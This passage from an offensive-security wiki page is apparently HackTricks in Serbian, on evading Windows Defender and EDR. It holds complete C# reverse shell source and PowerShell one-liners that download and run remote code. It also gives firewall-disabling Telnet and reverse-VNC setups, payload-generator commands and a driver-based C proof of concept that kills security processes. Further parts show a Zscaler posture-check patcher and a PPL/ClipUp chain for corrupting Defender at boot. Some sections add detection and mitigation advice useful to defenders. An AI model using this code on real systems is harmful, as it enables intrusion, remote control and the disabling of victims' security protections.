Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje sa nasumičnim ne-obfuskovanim reverse shell skriptama u tim jezicima se ispostavilo uspešnim.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili security proizvodom kao što je EDR ili AV**, dopuštajući im da mu smanje privilegije tako da proces neće umreti ali neće imati dozvole da proverava zlonamerne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **onemogućiti spoljnim procesima** da dobijaju handles nad tokenima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje poverljivog softvera

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno deploy-ovati Chrome Remote Desktop na žrtvinom PC-u i zatim ga koristiti za takeover i održavanje persistence:
1. Download sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", zatim kliknite na MSI fajl za Windows da preuzmete MSI fajl.
2. Pokrenite installer tiho na žrtvi (potrebna admin prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će zatim zatražiti autorizaciju; kliknite na Authorize dugme da nastavite.
4. Izvršite dati parametar sa nekim podešavanjima: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: pin param omogućava postavljanje pina bez upotrebe GUI-a).


## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg radite ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da dobijete uvod u naprednije tehnike evasion-a.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedan odličan talk od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Proverite koje delove Defender označava kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **otkrije koji deo Defender** smatra zlonamernim i podeli vam ga.\
Drugi alat koji radi **isto** je [**avred**](https://github.com/dobin/avred) sa web servisom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** prilikom podizanja sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (trebate bin verzije, ne setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Enable the option _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neopaženi, ne smete uraditi nekoliko stvari

- Nemojte pokretati `winvnc` ako već radi ili ćete pokrenuti a [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć ili ćete izazvati a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će vrlo brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompajler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja python-a za izradu injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što pusti ransomware. Alat donosi svoj **vulnerable ali *potpisani* drajver** i zloupotrebljava ga da izvede privilegovane kernel operacije koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključne napomene
1. **Signed driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani drajver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto drajver nosi validan Microsoft potpis, on se učitava čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje drajver kao **kernel servis** i druga ga pokreće tako da `\\.\ServiceMouse` postaje dostupan iz korisničkog prostora.
3. **IOCTL-ovi koje drajver izlaže**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminira proizvoljni proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljan fajl na disku |
| `0x990001D0` | Otpusti drajver i ukloni servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto funkcioniše**: BYOVD potpuno zaobilazi zaštite u user-mode-u; kod koji se izvršava u kernelu može otvoriti *protected* procese, terminirati ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge mehanizme ojačanja.

Detekcija / ublažavanje
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.
•  Pratite kreiranja novih *kernel* servisa i alarmirajte kada se drajver učita iz direktorijuma koji je world-writable (dozvoljava pisanje od strane svih) ili nije na allow-listi.
•  Pratite user-mode handle-ove ka custom device objektima koji su praćeni sumnjivim `DeviceIoControl` pozivima.

### Zaobilaženje Zscaler Client Connector provera posture-a putem patch-ovanja binarnih fajlova na disku

Zscaler-ov **Client Connector** primenjuje pravila device-posture lokalno i oslanja se na Windows RPC da prenese rezultate drugim komponentama. Dva slaba dizajnerska izbora omogućavaju potpuni bypass:

1. Evaluacija posture se odvija **kompletno na klijentu** (serveru se šalje boolean).
2. Interni RPC endpointi samo verifikuju da je povezani executable **potpisan od Zscalera** (putem `WinVerifyTrust`).

Patch-ovanjem četiri potpisana binarna fajla na disku obe mehanizme mogu biti neutralisane:

| Binarni fajl | Izmenjena originalna logika | Rezultat |
|--------------|-----------------------------|----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera u skladu |
| `ZSAService.exe` | Indirektan poziv na `WinVerifyTrust` | NOP-ovano ⇒ bilo koji (čak i nepotpisani) proces može da se poveže na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Skraćeno / bypass-ovano |

Minimalni izvod patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja servisnog steka:

* **All** posture checks prikazuju **green/compliant**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler policies.

Ova studija slučaja pokazuje kako čisto klijentske odluke zasnovane na poverenju i jednostavne provere potpisa mogu biti poražene sa par bajt izmena.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće hijerarhiju potpisnika/nivoa tako da samo equal-or-higher protected processes mogu da remete jedni druge. Ofanzivno, ako možete legitimno pokrenuti PPL-enabled binary i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-podržan write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Primer upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiv: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite PPL-sposoban LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da biste prisilili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 kratka imena ako je potrebno.
3) Ako je cilj-binar obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri bootu pre nego što AV startuje tako što instalirate servis za automatsko pokretanje koji se pouzdano izvršava ranije. Potvrdite redosled bootovanja pomoću Process Monitor (boot logging).
4) Na rebootu, upis sa PPL podrškom se događa pre nego što AV zaključa svoje binare, korumpirajući ciljani fajl i sprečavajući njegovo pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim lokacije; primitiv je prikladan za korupciju više nego za preciznu injekciju sadržaja.
- Zahteva local admin/SYSTEM privilegije da se servis instalira/pokrene i prozor za restart.
- Vreme je kritično: cilj ne sme biti otvoren; izvršenje pri podizanju sistema izbegava zaključavanje fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, posebno ako je roditelj ne-standardni launcher, u periodu podizanja sistema.
- Novi servisi konfigurisan da automatski pokreću sumnjive binarne fajlove i koji se dosledno pokreću pre Defender/AV. Istražite kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarnim/Platform direktorijumima; neočekivano kreiranje/izmena fajlova od procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane ne-AV binarnih fajlova.

Mitigacije
- WDAC/Code Integrity: ograničite koje potpisane binarke mogu da se pokreću kao PPL i pod kojim roditeljima; blokirajte ClipUp pozivanje van legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i pratite manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri startu koje ukazuju na korupciju binarnog fajla.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volumima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (temeljno testirajte).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Reference

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
